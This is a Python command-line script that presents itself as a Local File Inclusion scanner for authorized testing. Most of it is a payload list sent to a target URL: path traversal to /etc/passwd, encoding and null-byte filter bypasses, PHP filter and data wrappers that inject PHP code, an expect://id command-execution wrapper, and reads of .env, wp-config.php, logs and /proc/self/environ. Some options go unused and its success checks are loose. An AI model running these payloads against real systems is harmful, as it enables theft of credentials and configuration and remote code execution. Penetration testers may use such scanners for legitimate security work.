#!/usr/bin/env python3
"""
Local File Inclusion (LFI) Vulnerability Scanner
For ethical security testing only - use only on systems you own or have permission to test
"""

import requests
import urllib.parse
import base64
import time
import argparse
import re
import json
from datetime import datetime
from colorama import init, Fore, Style
import warnings
from urllib3.exceptions import InsecureRequestWarning

# Suppress SSL warnings for testing
warnings.filterwarnings('ignore', category=InsecureRequestWarning)
init(autoreset=True)

class LFIScanner:
    def __init__(self, target_url, verbose=False, threads=1):
        self.target_url = target_url
        self.verbose = verbose
        self.threads = threads
        self.session = requests.Session()
        self.session.verify = False  # For testing sites with self-signed certs
        self.results = {
            'vulnerable': False,
            'vulnerabilities': [],
            'tested_payloads': 0,
            'successful_payloads': []
        }
        
        # Common LFI payloads
        self.lfi_payloads = [
            # Basic traversal
            '../etc/passwd',
            '../../etc/passwd',
            '../../../etc/passwd',
            '../../../../etc/passwd',
            '../../../../../etc/passwd',
            '../../../../../../etc/passwd',
            '../../../../../../../etc/passwd',
            '../../../../../../../../etc/passwd',
            
            # Without ../
            'etc/passwd',
            '/etc/passwd',
            
            # Encoded traversal
            '..%2fetc%2fpasswd',
            '..%252fetc%252fpasswd',
            '%2e%2e%2fetc%2fpasswd',
            '%2e%2e%252fetc%252fpasswd',
            '..%c0%afetc%c0%afpasswd',
            
            # Double encoding
            '..%252f..%252f..%252fetc%252fpasswd',
            '%252e%252e%252f%252e%252e%252fetc%252fpasswd',
            
            # UTF-8 encoding
            '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
            '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd',
            
            # Null byte injection (for older PHP versions)
            '../etc/passwd%00',
            '../etc/passwd%0a',
            '../etc/passwd%00.jpg',
            '../etc/passwd%00.php',
            
            # Filter bypass
            '....//etc/passwd',
            '..././etc/passwd',
            '....\/etc/passwd',
            '..../\/etc/passwd',
            
            # PHP filters
            'php://filter/read=string.rot13/resource=index.php',
            'php://filter/convert.base64-encode/resource=index.php',
            'php://filter/convert.base64-encode/resource=../../../../../etc/passwd',
            'php://filter/resource=../../../../../etc/passwd',
            
            # PHP input/data streams
            'php://input',
            'data://text/plain,<?php phpinfo(); ?>',
            'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
            
            # Zip/Phar wrappers
            'zip://shell.zip%23shell.php',
            'phar://shell.phar/shell.php',
            
            # Expect wrapper
            'expect://id',
            'expect://ls',
            
            # Windows paths
            '..\\etc\\passwd',
            '..\\..\\..\\windows\\win.ini',
            'c:\\windows\\win.ini',
            'c:/windows/win.ini',
            '\\\\localhost\\c$\\windows\\win.ini',
            
            # Common Linux files
            '/proc/self/environ',
            '/proc/self/cmdline',
            '/proc/self/stat',
            '/proc/self/status',
            '/proc/self/fd/0',
            '/proc/self/fd/1',
            '/proc/self/fd/2',
            '/var/log/apache2/access.log',
            '/var/log/apache2/error.log',
            '/var/log/nginx/access.log',
            '/var/log/nginx/error.log',
            '/var/log/httpd/access_log',
            '/var/log/httpd/error_log',
            '/var/log/auth.log',
            '/var/log/syslog',
            '/etc/hosts',
            '/etc/hostname',
            '/etc/issue',
            '/etc/motd',
            '/etc/mysql/my.cnf',
            '/etc/apache2/apache2.conf',
            '/etc/nginx/nginx.conf',
            '/etc/ssh/sshd_config',
            
            # Application specific
            '../index.php',
            '../config.php',
            '../configuration.php',
            '../wp-config.php',
            '../config/database.php',
            '../../.env',
            '../.env',
            '../composer.json',
            '../package.json'
        ]
        
        # Indicators of successful LFI
        self.success_indicators = [
            # Linux
            'root:x:0:0',
            'daemon:x:',
            'nobody:x:',
            '/bin/bash',
            '/bin/sh',
            'www-data',
            
            # Windows
            '[fonts]',
            '[extensions]',
            '[mci extensions]',
            '[files]',
            '[Mail]',
            
            # PHP
            '<?php',
            'phpinfo()',
            
            # Config files
            'DB_HOST',
            'DB_PASSWORD',
            'mysql',
            'postgresql',
            
            # Logs
            'GET /',
            'POST /',
            'HTTP/1.',
            '404 Not Found',
            '200 OK',
            
            # General
            '#!/',
            'PATH=',
            'HOME=',
            'USER='
        ]
    
    def print_banner(self):
        """Print scanner banner"""
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}Local File Inclusion (LFI) Scanner")
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.GREEN}Target: {self.target_url}")
        print(f"{Fore.GREEN}Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{Fore.CYAN}{'='*60}\n")
    
    def test_lfi(self, param_name, param_value, payload):
        """Test a specific LFI payload"""
        # Build URL with payload
        parsed_url = urllib.parse.urlparse(self.target_url)
        params = urllib.parse.parse_qs(parsed_url.query)
        
        # Replace parameter value with payload
        params[param_name] = [payload]
        
        # Reconstruct URL
        new_query = urllib.parse.urlencode(params, doseq=True)
        test_url = urllib.parse.urlunparse(
            (parsed_url.scheme, parsed_url.netloc, parsed_url.path, 
             parsed_url.params, new_query, parsed_url.fragment)
        )
        
        if self.verbose:
            print(f"{Fore.BLUE}[*] Testing: {test_url}")
        
        try:
            # Test GET request
            response = self.session.get(test_url, timeout=10, allow_redirects=False)
            self.results['tested_payloads'] += 1
            
            # Check for success indicators
            if self.check_lfi_success(response):
                vuln_info = {
                    'url': test_url,
                    'method': 'GET',
                    'parameter': param_name,
                    'payload': payload,
                    'status_code': response.status_code,
                    'indicators_found': self.get_found_indicators(response.text),
                    'response_snippet': response.text[:500]
                }
                self.results['vulnerabilities'].append(vuln_info)
                self.results['successful_payloads'].append(payload)
                print(f"{Fore.RED}[!] LFI Found: Parameter '{param_name}' with payload: {payload}")
                print(f"{Fore.RED}    Indicators: {', '.join(vuln_info['indicators_found'][:3])}")
                return True
            
            # Test POST request
            post_data = {param_name: payload}
            response = self.session.post(self.target_url, data=post_data, timeout=10, allow_redirects=False)
            self.results['tested_payloads'] += 1
            
            if self.check_lfi_success(response):
                vuln_info = {
                    'url': self.target_url,
                    'method': 'POST',
                    'parameter': param_name,
                    'payload': payload,
                    'status_code': response.status_code,
                    'indicators_found': self.get_found_indicators(response.text),
                    'response_snippet': response.text[:500]
                }
                self.results['vulnerabilities'].append(vuln_info)
                self.results['successful_payloads'].append(payload)
                print(f"{Fore.RED}[!] LFI Found (POST): Parameter '{param_name}' with payload: {payload}")
                return True
                
        except requests.exceptions.Timeout:
            if self.verbose:
                print(f"{Fore.YELLOW}[-] Timeout for payload: {payload}")
        except Exception as e:
            if self.verbose:
                print(f"{Fore.YELLOW}[-] Error testing payload: {str(e)}")
        
        return False
    
    def check_lfi_success(self, response):
        """Check if response indicates successful LFI"""
        if not response or not response.text:
            return False
        
        response_text = response.text.lower()
        
        # Check for success indicators
        for indicator in self.success_indicators:
            if indicator.lower() in response_text:
                return True
        
        # Check for error messages that might indicate LFI attempt
        error_patterns = [
            'include(',
            'require(',
            'include_once(',
            'require_once(',
            'fopen(',
            'file_get_contents(',
            'failed to open stream',
            'no such file or directory',
            'system cannot find the file',
            'include path',
            'open_basedir restriction'
        ]
        
        for pattern in error_patterns:
            if pattern in response_text:
                # Error messages might indicate vulnerable but restricted LFI
                if self.verbose:
                    print(f"{Fore.YELLOW}[*] Possible LFI (restricted): {pattern}")
                return False
        
        return False
    
    def get_found_indicators(self, text):
        """Get list of indicators found in response"""
        found = []
        text_lower = text.lower()
        
        for indicator in self.success_indicators:
            if indicator.lower() in text_lower:
                found.append(indicator)
        
        return found
    
    def test_advanced_techniques(self, param_name):
        """Test advanced LFI techniques"""
        print(f"\n{Fore.YELLOW}[*] Testing advanced LFI techniques...")
        
        # Test long traversal strings
        long_traversal = '../' * 20 + 'etc/passwd'
        self.test_lfi(param_name, '', long_traversal)
        
        # Test with different wrappers
        wrappers = [
            'file:///etc/passwd',
            'php://filter/resource=/etc/passwd',
            'php://filter/read=convert.base64-encode/resource=/etc/passwd',
            'zip://archive.zip#shell.php',
            'data://text/plain,<?php system("id"); ?>',
            'expect://id'
        ]
        
        for wrapper in wrappers:
            self.test_lfi(param_name, '', wrapper)
        
        # Test truncation
        truncation_payloads = [
            '../etc/passwd' + '/' * 2048,
            '../etc/passwd' + '\x00' * 2048,
            '../etc/passwd' + '?' * 2048
        ]
        
        for payload in truncation_payloads:
            self.test_lfi(param_name, '', payload)
    
    def extract_parameters(self):
        """Extract parameters from URL and form inputs"""
        parameters = []
        
        # Extract from URL
        parsed_url = urllib.parse.urlparse(self.target_url)
        url_params = urllib.parse.parse_qs(parsed_url.query)
        
        for param in url_params:
            parameters.append(param)
        
        # Try to find form parameters
        try:
            response = self.session.get(self.target_url, timeout=10)
            # Simple regex to find input names
            input_pattern = r'<input[^>]+name=["\']([^"\']+)["\']'
            found_inputs = re.findall(input_pattern, response.text, re.IGNORECASE)
            
            for input_name in found_inputs:
                if input_name not in parameters:
                    parameters.append(input_name)
        except:
            pass
        
        # Common parameter names to test
        common_params = [
            'file', 'path', 'page', 'include', 'inc', 'locate', 'show', 'doc', 'site',
            'type', 'view', 'content', 'document', 'folder', 'root', 'dir', 'action',
            'board', 'date', 'detail', 'download', 'prefix', 'include_path', 'cat',
            'template', 'php_path', 'style', 'pdf', 'filename', 'id', 'name', 'url'
        ]
        
        # Add common params if URL has no parameters
        if not parameters:
            parameters.extend(common_params[:10])  # Test first 10 common params
        
        return parameters
    
    def scan(self):
        """Run the LFI scan"""
        self.print_banner()
        
        # Extract parameters to test
        parameters = self.extract_parameters()
        
        if not parameters:
            print(f"{Fore.YELLOW}[-] No parameters found to test")
            print(f"{Fore.YELLOW}[*] Testing common parameter names...")
            parameters = ['file', 'page', 'include', 'path', 'doc']
        
        print(f"{Fore.GREEN}[+] Found {len(parameters)} parameters to test: {', '.join(parameters)}")
        print(f"{Fore.GREEN}[+] Testing {len(self.lfi_payloads)} payloads per parameter")
        print(f"{Fore.CYAN}{'='*60}\n")
        
        # Test each parameter
        for param in parameters:
            print(f"\n{Fore.YELLOW}[*] Testing parameter: {param}")
            
            for payload in self.lfi_payloads:
                if self.test_lfi(param, '', payload):
                    self.results['vulnerable'] = True
                    # Continue testing other payloads for comprehensive results
                
                time.sleep(0.1)  # Rate limiting
            
            # Test advanced techniques
            if self.results['vulnerable']:
                self.test_advanced_techniques(param)
        
        # Print summary
        self.print_summary()
    
    def print_summary(self):
        """Print scan summary"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}Scan Summary")
        print(f"{Fore.CYAN}{'='*60}")
        
        print(f"{Fore.GREEN}[+] Total payloads tested: {self.results['tested_payloads']}")
        
        if self.results['vulnerable']:
            print(f"{Fore.RED}[!] Target is vulnerable to LFI!")
            print(f"{Fore.RED}[!] Successful payloads: {len(self.results['successful_payloads'])}")
            
            # Show unique successful payloads
            unique_payloads = list(set(self.results['successful_payloads']))
            print(f"\n{Fore.YELLOW}Successful payload examples:")
            for payload in unique_payloads[:5]:  # Show first 5
                print(f"  - {payload}")
        else:
            print(f"{Fore.GREEN}[+] No LFI vulnerabilities found")
        
        # Save results
        self.save_results()
    
    def save_results(self):
        """Save scan results to file"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"lfi_scan_{urllib.parse.quote(self.target_url.replace('://', '_'), safe='')}_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        print(f"\n{Fore.GREEN}[+] Detailed results saved to: {filename}")

def main():
    parser = argparse.ArgumentParser(
        description='Local File Inclusion (LFI) Vulnerability Scanner',
        epilog='Use responsibly and only on systems you own or have permission to test.'
    )
    parser.add_argument('url', help='Target URL to scan (e.g., http://example.com/index.php?page=home)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-t', '--threads', type=int, default=1, help='Number of threads (default: 1)')
    parser.add_argument('-p', '--parameter', help='Specific parameter to test')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds')
    
    args = parser.parse_args()
    
    # Validate URL
    if not args.url.startswith(('http://', 'https://')):
        args.url = 'http://' + args.url
    
    # Warning and confirmation
    print(f"{Fore.YELLOW}[!] WARNING: This tool is for authorized security testing only!")
    print(f"{Fore.YELLOW}[!] Using this tool without permission is illegal and unethical.")
    print(f"{Fore.YELLOW}[!] The tool will send many requests that may be logged by the target.")
    
    response = input(f"\n{Fore.CYAN}Do you have explicit permission to test {args.url}? (yes/no): ")
    
    if response.lower() != 'yes':
        print(f"{Fore.RED}Exiting... Only use this tool on systems you own or have permission to test.")
        return
    
    # Run scanner
    scanner = LFIScanner(args.url, verbose=args.verbose, threads=args.threads)
    scanner.scan()

if __name__ == '__main__':
    main()